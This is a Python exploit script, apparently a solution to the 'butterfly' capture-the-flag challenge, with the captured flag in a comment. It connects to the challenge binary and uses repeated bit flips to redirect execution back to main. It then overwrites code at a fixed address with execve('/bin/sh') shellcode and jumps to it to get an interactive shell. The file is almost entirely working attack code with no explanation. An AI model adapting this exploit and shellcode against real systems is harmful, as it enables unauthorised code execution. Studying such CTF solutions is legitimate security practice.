import pwnbox
import struct

# PCTF{b1t_fl1ps_4r3_0P_r1t3}

local = True

main_ = 0x400788
libc_init = 0x400890
if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q butterfly_33e86bcc2f0a21d57970dc6907867bed')
else:
    p = pwnbox.pipe.SocketPipe('butterfly.pwning.xxx',9999)

first_point = (0x400863) << 3 | 6

def xor_code(addr,pos):
    p.read_until('RAY?')
    p.write(('%d' % ((addr << 3) | pos)).ljust(40,'A') + struct.pack('<Q',main_) + '\n')

def xor_byte(addr,byte):
    for i in range(8):
	if byte & 1 :
	    xor_code(addr,i)
	byte /= 2

def change_byte(addr,orig,new):
    xor_byte(addr,orig)
    xor_byte(addr,new)

def change_bytes(addr,orig_bytes,new_bytes):
    for i in range(len(orig_bytes)):
	change_byte(addr+i, struct.unpack('<B',orig_bytes[i])[0], struct.unpack('<B',new_bytes[i])[0])


if local:
    p.read_until('(gdb)')
    #p.write('b *0x400860\n')
    p.write('r\n')


p.read_until('RAY?')
p.write(('%d'%first_point).ljust(40,'A') + struct.pack('<Q',main_)+'\n')
change_bytes(libc_init,'415741564189FF415541544C8D251602200055488D2D1602200053'.decode('hex'),'31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05'.decode('hex'))

p.read_until('RAY?')
p.write(('%d'%(0x40086B << 3 | 0)).ljust(40,'A') + struct.pack('<Q',libc_init) + '\n')
p.interact()

